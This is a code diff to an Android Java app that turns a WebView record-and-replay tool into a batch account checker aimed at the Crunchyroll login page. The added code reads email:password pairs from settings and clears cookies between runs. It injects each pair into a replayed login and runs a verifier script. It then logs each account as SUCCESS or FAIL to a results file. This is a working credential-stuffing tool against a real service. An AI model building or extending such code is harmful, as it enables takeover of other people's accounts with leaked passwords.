@@ -24,6 +24,8 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -35,14 +37,21 @@ public class MainActivity extends Activity {
 
     private static final String TAG = "WebAutomation";
     private WebView mWebView;
-    private final String mainUrl = "https://leofame.com/free-tiktok-views";
-    private Button btnRecord, btnStop, btnPlay;
+    private final String mainUrl = "https://sso.crunchyroll.com/login";
+    private Button btnRecord, btnStop, btnPlay, btnSettings, btnResults;
 
     private boolean isRecording = false;
     private boolean isReplaying = false;
     private long recordingStartTime = 0;
     private long replayStartTime = 0;
     private int lastExecutedIndex = -1;
+
+    // Batch Execution State
+    private List<String> credentialList = new ArrayList<>();
+    private int currentCredentialIndex = 0;
+    private boolean isBatchRunning = false;
+    private int verificationAttempts = 0;
+    private static final int MAX_VERIFICATION_ATTEMPTS = 15; // ~30 seconds
 
     // We store events in a synchronized list to handle multi-threaded access from Bridge
     private List<JSONObject> currentSessionEvents = Collections.synchronizedList(new ArrayList<>());
@@ -60,6 +69,8 @@ public class MainActivity extends Activity {
         btnRecord = findViewById(R.id.btn_record);
         btnStop = findViewById(R.id.btn_stop);
         btnPlay = findViewById(R.id.btn_play);
+        btnSettings = findViewById(R.id.btn_settings);
+        btnResults = findViewById(R.id.btn_results);
 
         setupWebView();
         setupButtons();
@@ -116,7 +127,9 @@ public class MainActivity extends Activity {
     private void setupButtons() {
         btnRecord.setOnClickListener(v -> startRecording());
         btnStop.setOnClickListener(v -> stopRecording());
-        btnPlay.setOnClickListener(v -> startReplay());
+        btnPlay.setOnClickListener(v -> startBatchReplay());
+        btnSettings.setOnClickListener(v -> startActivity(new android.content.Intent(this, SettingsActivity.class)));
+        btnResults.setOnClickListener(v -> showBatchResults());
     }
 
     private void startRecording() {
@@ -136,19 +149,65 @@ public class MainActivity extends Activity {
         Toast.makeText(this, "Stopped & Saved " + currentSessionEvents.size() + " events", Toast.LENGTH_SHORT).show();
     }
 
-    private void startReplay() {
+    private void startBatchReplay() {
         if (currentSessionEvents.isEmpty()) {
-            Toast.makeText(this, "No saved session to replay", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "No saved session to replay. Record one first.", Toast.LENGTH_SHORT).show();
+            return;
+        }
+
+        // Load credentials
+        SharedPreferences prefs = getSharedPreferences(SettingsActivity.PREFS_NAME, MODE_PRIVATE);
+        String creds = prefs.getString(SettingsActivity.KEY_CREDENTIALS, "");
+        if (creds.isEmpty()) {
+            Toast.makeText(this, "No credentials found. Check Settings.", Toast.LENGTH_SHORT).show();
+            return;
+        }
+
+        credentialList.clear();
+        String[] lines = creds.split("\n");
+        for (String line : lines) {
+            if (line.contains(":")) {
+                credentialList.add(line.trim());
+            }
+        }
+
+        if (credentialList.isEmpty()) {
+            Toast.makeText(this, "No valid credentials parsed.", Toast.LENGTH_SHORT).show();
             return;
         }
 
         isRecording = false;
         isReplaying = true;
+        isBatchRunning = true;
+        currentCredentialIndex = 0;
+
+        Toast.makeText(this, "Starting Batch Replay: " + credentialList.size() + " accounts", Toast.LENGTH_SHORT).show();
+        processNextCredential();
+    }
+
+    private void processNextCredential() {
+        if (currentCredentialIndex >= credentialList.size()) {
+            isBatchRunning = false;
+            isReplaying = false;
+            runOnUiThread(() -> new AlertDialog.Builder(MainActivity.this)
+                .setTitle("Batch Complete")
+                .setMessage("Processed all accounts.")
+                .setPositiveButton("OK", null)
+                .show());
+            return;
+        }
+
+        String currentPair = credentialList.get(currentCredentialIndex);
+        Log.d(TAG, "Processing: " + currentPair);
+
+        // Clear cookies to ensure fresh login
+        android.webkit.CookieManager.getInstance().removeAllCookies(null);
+        android.webkit.WebStorage.getInstance().deleteAllData();
+
         replayStartTime = System.currentTimeMillis();
-        lastExecutedIndex = -1; // Reset execution progress
+        lastExecutedIndex = -1;
 
         mWebView.loadUrl(mainUrl);
-        Toast.makeText(this, "Replay Started", Toast.LENGTH_SHORT).show();
     }
 
     private void injectRecorder() {
@@ -163,15 +222,146 @@ public class MainActivity extends Activity {
         Log.d(TAG, "Injecting Replayer Script");
         String js = readAssetFile("replayer.js");
 
+        verificationAttempts = 0;
+
+        // Get current credentials
+        String email = "";
+        String pass = "";
+        if (isBatchRunning && currentCredentialIndex < credentialList.size()) {
+            String[] parts = credentialList.get(currentCredentialIndex).split(":", 2);
+            if (parts.length > 0) email = parts[0].trim();
+            if (parts.length > 1) pass = parts[1].trim();
+        }
+
         // Convert list to JSON string
         JSONArray jsonArray = new JSONArray(currentSessionEvents);
         String eventsJson = jsonArray.toString();
 
+        // Use JSON object for overrides to avoid escaping issues
+        JSONObject overrides = new JSONObject();
+        try {
+            overrides.put("email", email);
+            overrides.put("password", pass);
+        } catch (JSONException e) {
+            Log.e(TAG, "Error creating override JSON", e);
+        }
+
         // Inject events, start time, and progress
         String setup = "window.replayEvents = " + eventsJson + "; " +
                        "window.replayStartTime = " + replayStartTime + "; " +
-                       "window.lastExecutedIndex = " + lastExecutedIndex + ";";
+                       "window.lastExecutedIndex = " + lastExecutedIndex + "; " +
+                       "var overrides = " + overrides.toString() + "; " +
+                       "window.overrideEmail = overrides.email; " +
+                       "window.overridePassword = overrides.password;";
+
         mWebView.evaluateJavascript(setup + js, null);
+
+        // Start checking for results after the estimated replay duration
+        long replayDuration = 0;
+        if (!currentSessionEvents.isEmpty()) {
+            try {
+                JSONObject last = currentSessionEvents.get(currentSessionEvents.size() - 1);
+                replayDuration = last.getLong("time");
+            } catch (JSONException e) {}
+        }
+
+        // Wait at least the replay duration + 5 seconds for network
+        mWebView.postDelayed(this::checkVerificationStatus, replayDuration + 5000);
+    }
+
+    private void checkVerificationStatus() {
+        if (!isBatchRunning) return;
+
+        if (verificationAttempts >= MAX_VERIFICATION_ATTEMPTS) {
+            logResult(false, "Timeout waiting for result");
+            moveToNext();
+            return;
+        }
+        verificationAttempts++;
+
+        String js = readAssetFile("verifier.js");
+        mWebView.evaluateJavascript(js, value -> {
+            // Value is returned as a JSON string wrapped in quotes, e.g. "{\"status\":\"success\"}"
+            // Android adds extra quotes around the return value of evaluateJavascript
+            if (value != null && value.length() > 2) {
+                 // Clean up the string (remove surrounding quotes if present)
+                 String jsonStr = value;
+                 if (jsonStr.startsWith("\"") && jsonStr.endsWith("\"")) {
+                     jsonStr = jsonStr.substring(1, jsonStr.length() - 1);
+                     // Unescape escaped quotes
+                     jsonStr = jsonStr.replace("\\\"", "\"");
+                 }
+
+                 try {
+                     JSONObject res = new JSONObject(jsonStr);
+                     String status = res.getString("status");
+
+                     if ("success".equals(status)) {
+                         logResult(true, res.optString("detail"));
+                         moveToNext();
+                     } else if ("failure".equals(status)) {
+                         logResult(false, res.optString("detail"));
+                         moveToNext();
+                     } else {
+                         // Still pending, check again in 2 seconds
+                         Log.d(TAG, "Verification pending: " + res.optString("detail"));
+                         mWebView.postDelayed(this::checkVerificationStatus, 2000);
+                     }
+                 } catch (JSONException e) {
+                     Log.e(TAG, "Error parsing verification result: " + value, e);
+                     // If we can't parse, assume pending or error, try again briefly or fail
+                     mWebView.postDelayed(this::checkVerificationStatus, 2000);
+                 }
+            } else {
+                mWebView.postDelayed(this::checkVerificationStatus, 2000);
+            }
+        });
+    }
+
+    private void logResult(boolean success, String detail) {
+        String cred = credentialList.get(currentCredentialIndex);
+        String msg = (success ? "SUCCESS" : "FAIL") + ": " + cred.split(":")[0] + " (" + detail + ")";
+        Log.i(TAG, "Batch Result: " + msg);
+        runOnUiThread(() -> Toast.makeText(this, msg, Toast.LENGTH_SHORT).show());
+        saveResultToFile(msg);
+    }
+
+    private void saveResultToFile(String resultLine) {
+        try {
+            java.io.FileOutputStream fos = openFileOutput("batch_results.txt", MODE_APPEND);
+            fos.write((resultLine + "\n").getBytes());
+            fos.close();
+        } catch (IOException e) {
+            Log.e(TAG, "Failed to save result", e);
+        }
+    }
+
+    private void showBatchResults() {
+        try {
+            java.io.FileInputStream fis = openFileInput("batch_results.txt");
+            BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
+            StringBuilder sb = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                sb.append(line).append("\n");
+            }
+            reader.close();
+
+            new AlertDialog.Builder(this)
+                .setTitle("Batch Results")
+                .setMessage(sb.length() > 0 ? sb.toString() : "No results yet.")
+                .setPositiveButton("OK", null)
+                .setNeutralButton("Clear", (d, w) -> deleteFile("batch_results.txt"))
+                .show();
+
+        } catch (IOException e) {
+            Toast.makeText(this, "No results found.", Toast.LENGTH_SHORT).show();
+        }
+    }
+
+    private void moveToNext() {
+        currentCredentialIndex++;
+        mWebView.postDelayed(this::processNextCredential, 1000);
     }
 
     private void saveSessionToPrefs() {
